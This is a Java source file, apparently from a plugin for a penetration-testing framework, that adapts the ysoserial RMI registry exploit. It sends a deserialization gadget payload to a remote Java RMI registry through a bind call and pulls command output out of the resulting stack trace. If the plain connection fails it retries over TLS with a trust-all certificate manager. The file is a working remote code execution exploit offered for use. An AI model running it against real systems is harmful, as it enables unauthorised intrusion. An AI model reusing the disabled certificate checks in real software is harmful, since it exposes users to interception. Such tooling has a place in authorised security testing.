package me.gv7.woodpecker.plugin.utils;

import me.gv7.woodpecker.yso.payloads.util.Gadgets;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;

/*
 * Utility program for exploiting RMI registries running with required gadgets available in their ClassLoader.
 * Attempts to exploit the registry itself, then enumerates registered endpoints and their interfaces.
 *
 * TODO: automatic exploitation of endpoints, potentially with automated download and use of jars containing remote
 * interfaces. See http://www.findmaven.net/api/find/class/org.springframework.remoting.rmi.RmiInvocationHandler .
 */
@SuppressWarnings({"rawtypes", "unchecked"})
public class RMIRegistryExploit {
	private static class TrustAllSSL implements X509TrustManager {
		private static final X509Certificate[] ANY_CA = {};
		public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
		public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
		public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
	}

	private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
		public Socket createSocket(String host, int port) throws IOException {
			try {
				SSLContext ctx = SSLContext.getInstance("TLS");
				ctx.init(null, new TrustManager[] {new TrustAllSSL()}, null);
				SSLSocketFactory factory = ctx.getSocketFactory();
				return factory.createSocket(host, port);
			} catch(Exception e) {
				throw new IOException(e);
			}
		}
	}

	public static String sendPayload(String host,int port,Object objPayload) throws Exception {
		String execRes = null;

//		Map<String, Object> map = new HashMap();
//		map.put("qihoo", objPayload);
//		InvocationHandler invo = (InvocationHandler) getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Retention.class, map);
//		Remote remote = (Remote) Proxy.newProxyInstance(RMIRegistryExploit.class.getClass().getClassLoader(), new Class[]{Remote.class}, invo);
//		Registry registry = LocateRegistry.getRegistry(host, port, new RMIClientSocketFactory() {
//			public Socket createSocket(String host, int port) throws IOException {
//				Socket socket = new Socket(host, port);
//				socket.setSoTimeout(3000);
//				return socket;
//			}
//		});

		Registry registry = LocateRegistry.getRegistry(host, port, new RMIClientSocketFactory() {
			@Override
			public Socket createSocket(String host, int port) throws IOException {
				Socket socket = new Socket(host, port);
				socket.setSoTimeout(15000);
				return socket;
			}
		});
		// Test RMI registry connection and upgrade to SSL connection on fail
		try {
			registry.list();
		} catch(ConnectIOException ex) {
			registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
		}

		// ensure payload doesn't detonate during construction or deserialization
		String name = "P" + System.nanoTime();
		Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, objPayload), Remote.class);
		try {
			registry.bind(name, remote);
		} catch (Throwable e) {
			StringWriter errors = new StringWriter();
			e.printStackTrace(new PrintWriter(errors));
			String result = errors.toString();
			//System.out.println(result);
			if (result.indexOf("###") != -1) {
				execRes = result.substring(result.indexOf("###") + 3, result.lastIndexOf("###"));
			}
		}
		return execRes;
	}
}
